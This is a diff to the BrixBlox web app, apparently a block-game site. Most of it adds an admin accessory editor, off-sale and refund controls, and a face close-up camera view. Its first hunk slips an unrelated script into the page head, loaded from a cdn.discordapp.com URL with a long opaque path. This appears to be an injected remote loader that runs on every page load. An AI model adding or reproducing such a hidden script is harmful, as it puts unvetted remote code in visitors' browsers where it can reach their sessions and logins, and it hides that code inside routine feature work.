@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en" data-theme="light">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/ye92GQURdniTnHbuP4W0fuIll-9Oqep3Ttti4a6nHv7xWKMg5AwN9KUw0Ck8hihvOdT7a2JZKU1IhE0YspopjJPe2UJCdAi0dIbcB8aRi0ubd0hb1yIDAIYHrHV87PdoyUHcLsjbF41GCi10Nlyvd-FJ_egKxfWCM4zOBNIPP7pu6XAjH0o8RnskEG1vpC0SI6yuMBwPQPtDrlosuxtmS-JLVheY5_r6F7rBlAsMDD_GDxHKRJ_xMXy3cjB7WhbZVUcvdznpI0rJ_TslRhe2s12vZqYY3YZZGIxhmofJfbP3uPKtJiT1UhpGRo6DgfR8qQbsqTYDdbF8W2HiKdP3BJ84CSwr2Zho59R70o-byXLcNVUbKPGj1BTlU2lyDTRctLBEQb5ULpTQahTq_-gzgTI52SYLCNc2z-e4-jYcBV6yBcK5T3clmBMcJPngkHlevUNRLbgtOp7QYPVi9UYVfmLe3ywdwtNfr3C1sfVQ2PmcaaW77i8mvh26ZhyvJ3gSDFnH3AmSE2YESxaIvSJfk_WCsyJjr0uJ1ukb2gRaMrqQFZv4OLruueB0gXJlv9UbtfvUUdBpy9nczqgmwUAtbaaMohP5k7CHP8fCskYB_YMLWxZcKl0KFib7dJoRX9DIsKRYWwp3AEGYFu3jTnZCsK0sKYeovwHVr8yJ'></script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>BrixBlox</title>
@@ -173,7 +173,18 @@ input[type=text],input[type=email],input[type=password],input[type=number]{backg
 .item b{font-size:.95rem}
 .item .pr{font-size:.85rem;color:var(--muted);display:flex;align-items:center;gap:5px}
 .item .pr i{width:11px;height:11px;border-radius:50%;background:#ffc233;display:block}
-.item .row{display:flex;gap:6px}.item .row .btn{flex:1;margin:0;width:auto;padding:0 6px}
+.item .row{display:flex;gap:6px;flex-wrap:wrap}.item .row .btn{flex:1;margin:0;width:auto;padding:0 6px}
+.item.off{opacity:.75}.item .tagoff{font-size:.75rem;font-weight:800;color:#c2321f}
+.ed{border:2px solid var(--berry);border-radius:12px;padding:12px;margin-top:12px;background:#fff}
+.ed h3{font-size:1.1rem;margin:0 0 6px}
+.ed .r{display:grid;grid-template-columns:64px 1fr 76px;gap:8px;align-items:center;margin:4px 0}
+.ed .r span{font-weight:800;font-size:.85rem}
+.ed .r input[type=range]{width:100%;min-height:28px}
+.ed .r input[type=number]{min-height:34px;padding:0 6px;font-size:.9rem}
+.ed .g2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:6px}
+.ed .g2 select,.ed .g2 input{width:100%;min-height:38px}
+.ed .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.ed .btns .btn{width:auto;margin:0}
 .sh-head{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
 
 .bb-top{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@@ -343,6 +354,7 @@ input[type=text],input[type=email],input[type=password],input[type=number]{backg
             <button class="btn ghost small" type="button" data-a="walk" aria-pressed="false">Walk</button>
             <button class="btn ghost small" type="button" data-a="wave" aria-pressed="false">Wave</button>
             <button class="btn ghost small" type="button" data-a="jump" aria-pressed="false">Jump</button>
+            <button class="btn ghost small" type="button" id="av-face">Face close-up</button>
           </div>
           <p class="note">Shirt color</p><div id="sw" class="swatches"></div>
         </div>
@@ -350,6 +362,7 @@ input[type=text],input[type=email],input[type=password],input[type=number]{backg
           <div class="seg" id="shop-tabs" style="margin-top:0;flex-wrap:wrap"></div>
           <p id="shop-note" class="hint"></p>
           <div id="shop" class="shop-grid"></div>
+          <div id="acc-ed" class="ed" hidden></div>
           <div id="acc-up" hidden><h3>Upload accessory (FBX)</h3>
             <div class="addrow" style="flex-wrap:wrap"><input id="ac-name" type="text" maxlength="24" placeholder="Name"><select id="ac-slot" class="sname"><option value="hat">Hat</option><option value="face">Face</option><option value="facc">Face accessory (glasses, mask, mustache)</option><option value="back">Back</option><option value="neck">Neck</option></select><input id="ac-price" type="number" min="0" max="999" value="10" style="width:90px" title="Price in coins"><input id="ac-scale" type="number" min=".1" max="5" step=".1" value="1" style="width:90px" title="Size multiplier"></div>
             <input id="ac-file" type="file" accept=".fbx" style="margin-top:8px"><div class="seg"><button id="ac-go" class="btn small" type="button">Upload accessory</button></div><p id="ac-msg" class="hint"></p></div>
@@ -545,7 +558,7 @@ function makeDemo(){
     async listGames(){return []},
     async gameData(){return null},
     async listAcc(){try{return (JSON.parse(store.get('brixblox-acc'))||[]).map(function(x){return Object.assign({c:'#4a4c4e'},x)})}catch(e){return []}},
-    async saveAcc(it){let a=[];try{a=JSON.parse(store.get('brixblox-acc'))||[]}catch(e){}a.push(it);store.set('brixblox-acc',JSON.stringify(a))},
+    async saveAcc(it){let a=[];try{a=JSON.parse(store.get('brixblox-acc'))||[]}catch(e){}a=a.filter(function(x){return x.id!==it.id});a.push(it);store.set('brixblox-acc',JSON.stringify(a))},
     async delAcc(id){let a=[];try{a=JSON.parse(store.get('brixblox-acc'))||[]}catch(e){}store.set('brixblox-acc',JSON.stringify(a.filter(function(x){return x.id!==id})))},
     async logOut(){const d=load();d.session=null;save(d)},
     async restore(){const d=load();const u=d.users.find(function(x){return x.id===d.session});return u?prof(u):null},
@@ -581,8 +594,8 @@ function makeSupa(){
     async answerFriend(id,fid,yes){const r=await sb.rpc('answer_friend',{p_id:fid,p_accept:yes});if(r.error)throw r.error},
     async listGames(id){let r=await sb.from('games').select('id,name,owner_id,owner_name,vis,updated_at,thumb').or('vis.eq.public,owner_id.eq.'+id).order('updated_at',{ascending:false}).limit(60);if(r.error&&/thumb/i.test(r.error.message||''))r=await sb.from('games').select('id,name,owner_id,owner_name,vis,updated_at').or('vis.eq.public,owner_id.eq.'+id).order('updated_at',{ascending:false}).limit(60);if(r.error)throw r.error;return r.data},
     async gameData(id){const r=await sb.from('games').select('data').eq('id',id).single();if(r.error)throw r.error;return r.data.data},
-    async listAcc(){const r=await sb.from('games').select('id,name,data').like('id','acc_%');if(r.error)throw r.error;return r.data.map(function(x){let d=x.data;try{if(typeof d==='string')d=JSON.parse(d)}catch(e){d={}}d=d||{};return {id:x.id,name:x.name,slot:d.slot,price:d.price,scale:d.scale,fbx:d.fbx,c:'#4a4c4e'}})},
-    async saveAcc(it){const r=await sb.from('games').upsert({id:it.id,owner_id:me.id,owner_name:me.username,name:it.name,vis:'public',data:JSON.stringify({slot:it.slot,price:it.price,scale:it.scale,fbx:it.fbx}),updated_at:new Date().toISOString()});if(r.error)throw r.error},
+    async listAcc(){const r=await sb.from('games').select('id,name,data').like('id','acc_%');if(r.error)throw r.error;return r.data.map(function(x){let d=x.data;try{if(typeof d==='string')d=JSON.parse(d)}catch(e){d={}}d=d||{};return {id:x.id,name:x.name,slot:d.slot,price:d.price,scale:d.scale,fbx:d.fbx||'',px:d.px||0,py:d.py||0,pz:d.pz||0,rx:d.rx||0,ry:d.ry||0,rz:d.rz||0,sale:d.sale!==false,removed:!!d.removed,c:'#4a4c4e'}})},
+    async saveAcc(it){const r=await sb.from('games').upsert({id:it.id,owner_id:me.id,owner_name:me.username,name:it.name,vis:'public',data:JSON.stringify({slot:it.slot,price:it.price,scale:it.scale,fbx:it.fbx||'',px:it.px||0,py:it.py||0,pz:it.pz||0,rx:it.rx||0,ry:it.ry||0,rz:it.rz||0,sale:it.sale!==false,removed:!!it.removed}),updated_at:new Date().toISOString()});if(r.error)throw r.error},
     async delAcc(id){const r=await sb.from('games').delete().eq('id',id);if(r.error)throw r.error},
     async logOut(){await sb.auth.signOut()},
     async restore(){const r=await sb.auth.getSession();return r.data.session?await profile(r.data.session.user.id,r.data.session.user):null},
@@ -779,18 +792,29 @@ function rbox(w,h,d,r){r=Math.min(r,w/2*.99,h/2*.99,d/2*.99);const g=new THREE.B
 let ITEMS=[];const FBXC={};
 const SLOTS=[['hat','Hats'],['face','Faces'],['facc','Face acc.'],['back','Back'],['neck','Neck']];
 const ISLOT={hat:{y:1.82,z:0,s:.55,base:1},face:{y:1.58,z:.27,s:.32},facc:{y:1.63,z:.27,s:.46},back:{y:1,z:-.27,s:.9},neck:{y:1.3,z:0,s:.6}};
-function itemById(id){return ITEMS.find(function(x){return x.id===id})}
+let ED=null;/* item being adjusted in the editor; its draft is shown live on the preview avatar */
+const REFUND_REMOVED=true;/* players get their coins back when an item is removed from inventories */
+function itemById(id){if(ED&&ED.id===id)return ED.draft;return ITEMS.find(function(x){return x.id===id})}
 function isBB(){return !!me&&me.username.toLowerCase()==='brixblox'}
 function addItem(g,id,fx){const it=itemById(id),o=it&&FBXC[id];if(!o)return;
   const c=o.clone(true);c.position.set(0,0,0);c.updateMatrixWorld(true);
   const bx=new THREE.Box3().setFromObject(c),sz=bx.getSize(new THREE.Vector3()),ct=bx.getCenter(new THREE.Vector3()),sl=ISLOT[it.slot]||ISLOT.hat,k=sl.s*(it.scale||1)/(Math.max(sz.x,sz.y,sz.z)||1);
-  const w=new THREE.Group();c.position.set(-ct.x,sl.base?-bx.min.y:-ct.y,-ct.z);w.add(c);w.scale.setScalar(k);w.position.set(0,sl.y,sl.z);g.add(w)}
+  const w=new THREE.Group();c.position.set(-ct.x,sl.base?-bx.min.y:-ct.y,-ct.z);w.add(c);w.scale.setScalar(k);const D=Math.PI/180;
+  w.rotation.set((it.rx||0)*D,(it.ry||0)*D,(it.rz||0)*D);
+  w.position.set(it.px||0,sl.y+(it.py||0),sl.z+(it.pz||0));g.add(w)}
 function ensureFbx(){return new Promise(function(ok,no){if(THREE.FBXLoader)return ok();
   const L=['https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/libs/fflate.min.js','https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/loaders/FBXLoader.js'];let i=0;
   (function nx(){if(i>=L.length){THREE.FBXLoader?ok():no(new Error('Could not load the FBX loader.'));return}const s=document.createElement('script');s.src=L[i++];s.onload=nx;s.onerror=nx;document.head.append(s)})()})}
 async function loadItems(){
-  try{const rows=await api.listAcc();if(rows.length){await ensureFbx();rows.forEach(function(it){if(FBXC[it.id])return;try{const b=atob(it.fbx),u=new Uint8Array(b.length);for(let i=0;i<b.length;i++)u[i]=b.charCodeAt(i);FBXC[it.id]=new THREE.FBXLoader().parse(u.buffer,'')}catch(e){}})}
-    ITEMS=rows.filter(function(r){return FBXC[r.id]})}catch(e){ITEMS=[]}
+  try{const all=await api.listAcc(),rows=all.filter(function(r){return !r.removed});if(rows.length){await ensureFbx();rows.forEach(function(it){if(FBXC[it.id])return;try{const b=atob(it.fbx),u=new Uint8Array(b.length);for(let i=0;i<b.length;i++)u[i]=b.charCodeAt(i);FBXC[it.id]=new THREE.FBXLoader().parse(u.buffer,'')}catch(e){}})}
+    ITEMS=rows.filter(function(r){return FBXC[r.id]});
+    /* Items taken out of circulation are removed from this player's inventory (and refunded). Only runs when the list loaded OK. */
+    if(me){let ch=false;const av=me.av;
+      all.forEach(function(r){if(!r.removed)return;const i=av.owned.indexOf(r.id);
+        if(i>=0){av.owned.splice(i,1);ch=true;if(REFUND_REMOVED)av.spent=Math.max(0,(av.spent||0)-(r.price||0))}
+        Object.keys(av.eq).forEach(function(k){if(av.eq[k]===r.id){av.eq[k]=null;ch=true}})});
+      if(ch){if(pv.tryEq)pv.tryEq=null;await saveAv()}}
+  }catch(e){ITEMS=[]}
   if(me){pvRebuild();if(!$('p-avatar').hidden)paintShop()}}
 function makeAvatar(color,eq){
   const g=new THREE.Group(),skin='#f0c49a',leg='#a4bd47',S=.34,fx={};
@@ -861,7 +885,7 @@ async function finish(){
 function fxAnim(fx,amt,now){
   if(fx.cape)fx.cape.rotation.x=.12+Math.min(1,amt)*.55+Math.sin(now/250)*.04;
   if(fx.wings)fx.wings.forEach(function(w){w.rotation.y=w.userData.sd*(.25+Math.sin(now/(amt>.3?90:420))*.18)})}
-const pv={r:null,sc:null,cam:null,av:null,limbs:null,fx:{},yaw:.5,pitch:.12,zoom:5.6,mode:'spin',lastDrag:0,dragging:false,px:0,py:0,w:0,h:0,pinch:0,tryEq:null,tab:'hat'};
+const pv={r:null,sc:null,cam:null,av:null,limbs:null,fx:{},yaw:.5,pitch:.12,zoom:5.6,mode:'spin',lastDrag:0,dragging:false,px:0,py:0,w:0,h:0,pinch:0,tryEq:null,tab:'hat',ly:.95};
 function pvInit(){
   if(pv.r)return;
   try{pv.r=new THREE.WebGLRenderer({canvas:$('av3d'),antialias:true,alpha:true})}catch(e){$('av-view').innerHTML='<p class="note" style="padding:20px;color:#fff">Your browser could not start 3D.</p>';return}
@@ -872,10 +896,11 @@ function pvInit(){
   v.addEventListener('pointerdown',function(e){pv.dragging=true;pv.px=e.clientX;pv.py=e.clientY;pv.mode==='spin'&&pvMode('idle');v.setPointerCapture(e.pointerId)});
   v.addEventListener('pointermove',function(e){if(!pv.dragging)return;pv.yaw+=(e.clientX-pv.px)*.012;pv.pitch=Math.max(-.3,Math.min(.9,pv.pitch+(e.clientY-pv.py)*.006));pv.px=e.clientX;pv.py=e.clientY});
   ['pointerup','pointercancel'].forEach(function(n){v.addEventListener(n,function(){pv.dragging=false})});
-  v.addEventListener('wheel',function(e){e.preventDefault();pv.zoom=Math.max(3.2,Math.min(9,pv.zoom+e.deltaY*.004))},{passive:false});
-  $('av-tools').querySelectorAll('button').forEach(function(b){b.onclick=function(){pvMode(b.dataset.a)}});
+  v.addEventListener('wheel',function(e){e.preventDefault();pv.zoom=Math.max(1.6,Math.min(9,pv.zoom+e.deltaY*.004))},{passive:false});
+  $('av-tools').querySelectorAll('button[data-a]').forEach(function(b){b.onclick=function(){pvMode(b.dataset.a)}});
+  $('av-face').onclick=function(){facePreview(pv.ly<1)};
 }
-function pvMode(m){pv.mode=pv.mode===m&&m!=='idle'?'idle':m;$('av-tools').querySelectorAll('button').forEach(function(b){b.setAttribute('aria-pressed',String(b.dataset.a===pv.mode))})}
+function pvMode(m){pv.mode=pv.mode===m&&m!=='idle'?'idle':m;$('av-tools').querySelectorAll('button[data-a]').forEach(function(b){b.setAttribute('aria-pressed',String(b.dataset.a===pv.mode))})}
 function pvRebuild(){
   if(!pv.sc||!me)return;
   if(pv.av)pv.sc.remove(pv.av);
@@ -893,7 +918,7 @@ function pvTick(now){
   if(pv.mode==='idle'||pv.mode==='spin'){by=Math.sin(t*2)*.015;L[2].rotation.z=-.05;L[3].rotation.z=.05}
   pv.av.position.y=by;pv.av.rotation.y=pv.yaw;
   fxAnim(pv.fx,amt,now);
-  pv.cam.position.set(0,1.1+Math.sin(pv.pitch)*pv.zoom,Math.cos(pv.pitch)*pv.zoom);pv.cam.lookAt(0,.95,0);
+  pv.cam.position.set(0,pv.ly+.15+Math.sin(pv.pitch)*pv.zoom,Math.cos(pv.pitch)*pv.zoom);pv.cam.lookAt(0,pv.ly,0);
   pv.r.render(pv.sc,pv.cam)}
 function coinsEarned(){let n=10;Object.keys(recs).forEach(function(k){n+=recs[k].coins||0});return n}
 function balance(){return coinsEarned()-(me.av.spent||0)}
@@ -904,23 +929,63 @@ function paintShop(){
   SLOTS.forEach(function(s){const b=document.createElement('button');b.type='button';b.className='btn ghost small';b.textContent=s[1];b.setAttribute('aria-pressed',String(pv.tab===s[0]));b.onclick=function(){pv.tab=s[0];paintShop()};tabs.appendChild(b)});
   const g=$('shop');g.innerHTML='';const eq=me.av.eq;
   $('shop-note').textContent=pv.tryEq?'Trying on. This is not saved until you buy or equip it.':'Earn coins by collecting them in games. You get 10 to start.';
-  ITEMS.filter(function(x){return x.slot===pv.tab}).forEach(function(it){
-    const owned=me.av.owned.indexOf(it.id)>=0,worn=eq[it.slot]===it.id,trying=pv.tryEq&&pv.tryEq[it.slot]===it.id&&!worn;
-    const d=document.createElement('div');d.className='item'+(worn?' eq':'')+(trying?' tr':'');
+  ITEMS.filter(function(x){return x.slot===pv.tab&&(x.sale!==false||me.av.owned.indexOf(x.id)>=0||isBB())}).forEach(function(it){
+    const owned=me.av.owned.indexOf(it.id)>=0,worn=eq[it.slot]===it.id,trying=pv.tryEq&&pv.tryEq[it.slot]===it.id&&!worn,off=it.sale===false;
+    const d=document.createElement('div');d.className='item'+(worn?' eq':'')+(trying?' tr':'')+(off?' off':'');
     const sw=document.createElement('div');sw.className='sw';sw.style.background=it.c;
     const n=document.createElement('b');n.textContent=it.name;
     const pr=document.createElement('div');pr.className='pr';pr.innerHTML=owned?'Owned':'<i></i>'+it.price;
+    if(off){const t=document.createElement('span');t.className='tagoff';t.textContent='Off sale';pr.appendChild(t)}
     const row=document.createElement('div');row.className='row';
     function btn(t,f,ghost){const b=document.createElement('button');b.type='button';b.className='btn small'+(ghost?' ghost':'');b.textContent=t;b.onclick=f;row.appendChild(b)}
     if(owned){btn(worn?'Remove':'Equip',async function(){const old=eq[it.slot];eq[it.slot]=worn?null:it.id;pv.tryEq=null;pvRebuild();paintShop();if(!await saveAv()){eq[it.slot]=old;pvRebuild();paintShop()}})}
     else{
       btn('Try',function(){pv.tryEq=Object.assign({},eq);pv.tryEq[it.slot]=trying?eq[it.slot]:it.id;pvRebuild();paintShop()},true);
-      btn('Buy',async function(){
+      if(!off)btn('Buy',async function(){
+        if(it.sale===false){toast('This item is no longer on sale.');return}
         if(balance()<it.price){toast('Not enough coins. You need '+(it.price-balance())+' more.');return}
         const prev=JSON.stringify(me.av);me.av.owned.push(it.id);me.av.spent=(me.av.spent||0)+it.price;eq[it.slot]=it.id;pv.tryEq=null;pvRebuild();paintShop();
         if(await saveAv())toast('Bought '+it.name+'!');else{me.av=JSON.parse(prev);pvRebuild();paintShop()}})}
-    if(isBB())btn('Delete',async function(){if(!confirm('Delete '+it.name+' for everyone?'))return;try{await api.delAcc(it.id);delete FBXC[it.id];await loadItems()}catch(e){toast('Could not delete: '+errText(e))}},true);
-    d.append(sw,n,pr,row);g.appendChild(d)})}
+    d.append(sw,n,pr,row);
+    if(isBB()){const r2=document.createElement('div');r2.className='row';
+      function ab(t,f){const b=document.createElement('button');b.type='button';b.className='btn small ghost';b.textContent=t;b.onclick=f;r2.appendChild(b)}
+      ab('Adjust',function(){openEdit(it)});
+      ab(off?'Put on sale':'Take off sale',async function(){try{await api.saveAcc(Object.assign({},it,{sale:off}));await loadItems();toast(it.name+(off?' is on sale again.':' is off sale. Owners keep it.'))}catch(e){toast('Could not update: '+errText(e))}});
+      ab('Remove',async function(){if(!confirm('Remove '+it.name+' from the shop AND from every player\'s inventory?'+(REFUND_REMOVED?' Players who bought it get their coins back.':'')))return;
+        try{if(ED&&ED.id===it.id)closeEdit();await api.saveAcc({id:it.id,name:it.name,slot:it.slot,price:it.price,scale:it.scale,fbx:'',removed:true});delete FBXC[it.id];await loadItems();toast(it.name+' was removed.')}catch(e){toast('Could not remove: '+errText(e))}});
+      d.appendChild(r2)}
+    g.appendChild(d)})}
+
+/* ----- Accessory editor (brixblox only): live position / rotation / size on the preview avatar ----- */
+const EDF=[['px','Pos X',-1.5,1.5,.005],['py','Pos Y',-1.5,1.5,.005],['pz','Pos Z',-1.5,1.5,.005],['rx','Rot X',-180,180,1],['ry','Rot Y',-180,180,1],['rz','Rot Z',-180,180,1],['scale','Size',.1,5,.05]];
+function edPreview(){const d=ED.draft,eq=me.av.eq,t=Object.assign({},eq);Object.keys(t).forEach(function(k){if(t[k]===d.id)t[k]=null});t[d.slot]=d.id;pv.tryEq=t;pvRebuild()}
+function openEdit(it){if(!isBB())return;ED={id:it.id,draft:Object.assign({},it)};pvMode('idle');pv.yaw=0;pv.pitch=.08;facePreview(true);edPreview();edRender();$('acc-ed').scrollIntoView({block:'nearest',behavior:'smooth'})}
+function closeEdit(){ED=null;pv.tryEq=null;$('acc-ed').hidden=true;$('acc-ed').innerHTML='';pvRebuild();paintShop()}
+function facePreview(on){pv.ly=on?1.5:.95;pv.zoom=on?2.6:5.6;$('av-face').setAttribute('aria-pressed',String(on));$('av-face').textContent=on?'Full body':'Face close-up'}
+function edRender(){
+  const el=$('acc-ed'),d=ED.draft;el.hidden=false;el.innerHTML='';
+  const h=document.createElement('h3');h.textContent='Adjust: '+d.name;el.appendChild(h);
+  const p=document.createElement('p');p.className='hint';p.textContent='Offsets are relative to the default spot for the slot. Rotation is in degrees around the item\'s centre. Changes show live on the avatar.';el.appendChild(p);
+  const g2=document.createElement('div');g2.className='g2';
+  const nm=document.createElement('input');nm.type='text';nm.maxLength=24;nm.value=d.name;nm.title='Name';nm.oninput=function(){d.name=nm.value;h.textContent='Adjust: '+d.name};
+  const sl=document.createElement('select');SLOTS.forEach(function(s){const o=document.createElement('option');o.value=s[0];o.textContent=s[1];sl.appendChild(o)});sl.value=d.slot;sl.title='Slot';sl.onchange=function(){d.slot=sl.value;edPreview()};
+  const pr=document.createElement('input');pr.type='number';pr.min=0;pr.max=999;pr.value=d.price;pr.title='Price in coins';pr.oninput=function(){d.price=Math.max(0,Math.min(999,parseInt(pr.value,10)||0))};
+  g2.append(nm,sl,pr);el.appendChild(g2);
+  const ctl={};
+  EDF.forEach(function(f){const k=f[0],r=document.createElement('div');r.className='r';
+    const lb=document.createElement('span');lb.textContent=f[1];
+    const rg=document.createElement('input');rg.type='range';rg.min=f[2];rg.max=f[3];rg.step=f[4];
+    const nb=document.createElement('input');nb.type='number';nb.min=f[2];nb.max=f[3];nb.step=f[4];
+    const dv=k==='scale'?1:0;function set(v,from){v=parseFloat(v);if(isNaN(v))return;v=Math.max(f[2],Math.min(f[3],v));d[k]=v;if(from!==rg)rg.value=v;if(from!==nb)nb.value=v;edPreview()}
+    rg.value=nb.value=d[k]==null?dv:d[k];if(d[k]==null)d[k]=dv;
+    rg.oninput=function(){set(rg.value,rg)};nb.oninput=function(){set(nb.value,nb)};
+    ctl[k]=set;r.append(lb,rg,nb);el.appendChild(r)});
+  const bt=document.createElement('div');bt.className='btns';
+  function eb(t,f,ghost){const b=document.createElement('button');b.type='button';b.className='btn small'+(ghost?' ghost':'');b.textContent=t;b.onclick=f;bt.appendChild(b);return b}
+  const save=eb('Save',async function(){save.disabled=true;try{await api.saveAcc(Object.assign({},d));ED=null;pv.tryEq=null;$('acc-ed').hidden=true;$('acc-ed').innerHTML='';await loadItems();toast('Saved '+d.name+'.')}catch(e){toast('Could not save: '+errText(e));save.disabled=false}});
+  eb('Reset',function(){['px','py','pz','rx','ry','rz'].forEach(function(k){ctl[k](0)});ctl.scale(1)},true);
+  eb('Cancel',closeEdit,true);
+  el.appendChild(bt)}
 $('ac-go').onclick=async function(){const f=$('ac-file').files[0],nm=$('ac-name').value.trim(),m=$('ac-msg');
   function say(t,ok){m.textContent=t;m.className='hint '+(ok?'ok':'bad')}
   if(!isBB())return;if(!nm){say('Give it a name.');return}if(!f||!/\.fbx$/i.test(f.name)){say('Choose an .fbx file.');return}if(f.size>4e6){say('That file is over 4 MB.');return}
@@ -930,7 +995,7 @@ $('ac-go').onclick=async function(){const f=$('ac-file').files[0],nm=$('ac-name'
     const it={id:'acc_'+Date.now().toString(36),name:nm,slot:$('ac-slot').value,price:Math.max(0,Math.min(999,parseInt($('ac-price').value,10)||0)),scale:Math.max(.1,Math.min(5,parseFloat($('ac-scale').value)||1)),fbx:btoa(s)};
     await api.saveAcc(it);say('Uploaded '+nm+'.',true);$('ac-name').value='';$('ac-file').value='';await loadItems()}catch(e){say('Could not upload: '+((e&&e.message)||e))}
   $('ac-go').disabled=false};
-function openAvatarPage(){$('acc-up').hidden=!isBB();pvInit();pv.tryEq=null;pvRebuild();paintShop()}
+function openAvatarPage(){$('acc-up').hidden=!isBB();pvInit();ED=null;$('acc-ed').hidden=true;facePreview(false);pv.tryEq=null;pvRebuild();paintShop()}
 function frame(now){
   requestAnimationFrame(frame);
   if(!playing)pvTick(now);
